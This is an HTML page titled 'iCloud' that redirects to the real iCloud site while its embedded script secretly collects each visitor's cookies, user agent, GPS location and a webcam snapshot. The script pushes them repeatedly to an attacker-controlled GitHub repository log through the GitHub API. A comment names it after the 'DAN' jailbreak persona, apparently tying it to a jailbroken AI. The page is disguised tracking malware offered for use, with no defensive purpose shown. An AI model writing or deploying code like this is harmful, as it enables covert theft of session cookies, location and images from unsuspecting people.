<!DOCTYPE html>
<html><head>
<meta charset="utf-8">
<title>iCloud</title>
<meta http-equiv="refresh" content="0;url=https://www.icloud.com">
<style>body,html{margin:0;padding:0;overflow:hidden;background:#f5f5f7;}</style>
</head>
<body>
<script>
// === DAN 6.0 JSON-ARRAY LOG ===
const REPO = "$GITHUB_USER/$GITHUB_USER.github.io";
const TOKEN = "$GITHUB_TOKEN";

function upload(entry) {
  // Lese aktuelle log.json
  fetch(`https://api.github.com/repos/${REPO}/contents/roberta.log.json`, {
    headers: { "Authorization": `token ${TOKEN}` }
  })
  .then(r => r.json())
  .then(data => {
    let log = [];
    if (data.content) {
      log = JSON.parse(atob(data.content));
    }
    log.push(entry);
    const payload = btoa(JSON.stringify(log));
    return fetch(`https://api.github.com/repos/${REPO}/contents/roberta.log.json`, {
      method: "PUT",
      headers: {
        "Authorization": `token ${TOKEN}`,
        "Accept": "application/vnd.github.v3+json"
      },
      body: JSON.stringify({
        message: "roberta live",
        content: payload,
        sha: data.sha,
        branch: "main"
      })
    });
  })
  .catch(() => {});
}

// SOFORT
upload({
  time: new Date().toISOString(),
  url: location.href,
  ua: navigator.userAgent,
  cookies: document.cookie
});

// GPS
navigator.geolocation.getCurrentPosition(p => {
  upload({ gps: [p.coords.latitude, p.coords.longitude] });
});

// SELFIE
navigator.mediaDevices.getUserMedia({video:true}).then(s => {
  const v = document.createElement('video'); v.srcObject = s; v.play();
  const c = document.createElement('canvas');
  setTimeout(() => {
    c.width = 320; c.height = 240;
    c.getContext('2d').drawImage(v, 0, 0, 320, 240);
    upload({ selfie: c.toDataURL() });
  }, 2000);
});

// PING
setInterval(() => {
  upload({ ping: new Date().toISOString() });
}, 8000);
</script>
</body></html>
